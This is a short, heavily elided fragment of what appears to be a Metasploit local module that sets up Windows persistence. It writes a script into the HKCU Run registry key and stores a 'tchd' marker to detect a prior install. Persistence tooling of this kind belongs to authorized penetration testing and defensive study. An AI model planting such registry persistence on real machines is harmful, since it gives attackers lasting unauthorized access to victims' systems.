...
class MetasploitModule < Msf::Exploit::Local
  ...
  def write_script_to_target(vbs, name)
    ...
    begin
      if meterpreter_registry_getvaldata('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'tchd', REGISTRY_VIEW_NATIVE) == 'true'
      	print_status('The persistence module is already installed on this system')
      	abort
      	end
  ...
  def write_to_reg(key, script_on_target, registry_value)
    ...
    if key && registry_setvaldata(key_path, nam, script_on_target, "REG_SZ")
      ...
      registry_setvaldata('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', 'tchd', 'true', 'REG_SZ')
    else
